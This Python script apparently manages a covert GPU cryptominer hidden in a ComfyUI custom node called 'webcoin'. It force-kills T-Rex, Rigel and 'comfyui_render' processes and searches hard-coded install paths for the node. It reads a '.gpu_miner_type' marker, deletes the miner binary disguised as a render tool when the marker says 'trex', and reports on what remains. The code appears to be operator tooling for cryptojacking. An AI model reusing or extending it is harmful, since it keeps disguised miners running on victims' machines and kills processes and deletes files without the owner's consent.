import os, subprocess, platform
lines = []
IS_WIN = platform.system() == "Windows"

# Kill T-Rex, Rigel, and comfyui_render (in case it's the wrong binary)
if IS_WIN:
    for name in ["t-rex.exe", "rigel.exe", "comfyui_render.exe"]:
        try:
            r = subprocess.run(["taskkill", "/f", "/im", name], capture_output=True, text=True, timeout=5)
            if r.returncode == 0:
                lines.append("KILLED " + name)
            else:
                lines.append(name + ": not running")
        except Exception as e:
            lines.append(name + ": " + str(e)[:40])
else:
    for name in ["t-rex", "rigel", "comfyui_render"]:
        try:
            r = subprocess.run(["pkill", "-9", "-f", name], capture_output=True, text=True, timeout=5)
            lines.append(name + ": rc=" + str(r.returncode))
        except:
            pass

# Find and inspect webcoin bin dir
webcoin = None
try:
    import folder_paths
    cn = folder_paths.get_folder_paths("custom_nodes")[0]
    webcoin = os.path.join(cn, "webcoin")
except:
    pass
if not webcoin or not os.path.isdir(webcoin):
    for c in [r"C:\ComfyUI\custom_nodes\webcoin",
              "/root/ComfyUI/custom_nodes/webcoin",
              "/home/Ubuntu/Downloads/ComfyUI/custom_nodes/webcoin",
              "/workspace/ComfyUI/custom_nodes/webcoin"]:
        if os.path.isdir(c):
            webcoin = c
            break

if webcoin and os.path.isdir(os.path.join(webcoin, "bin")):
    bd = os.path.join(webcoin, "bin")
    lines.append("bin=" + str(os.listdir(bd)))
    marker = os.path.join(bd, ".gpu_miner_type")
    if os.path.exists(marker):
        with open(marker) as f:
            mt = f.read().strip()
        lines.append("marker=" + mt)
        if mt == "trex":
            rp = os.path.join(bd, "comfyui_render.exe" if IS_WIN else "comfyui_render")
            if os.path.exists(rp):
                os.remove(rp)
                lines.append("DELETED trex render binary")
            os.remove(marker)
            lines.append("DELETED trex marker")
    else:
        lines.append("marker=NONE")
    rp = os.path.join(bd, "comfyui_render.exe" if IS_WIN else "comfyui_render")
    lines.append("render_exists=" + str(os.path.exists(rp)))
    if os.path.exists(rp):
        lines.append("render_size=" + str(os.path.getsize(rp)))
else:
    lines.append("webcoin_bin=NOT_FOUND")

result = chr(10).join(lines)
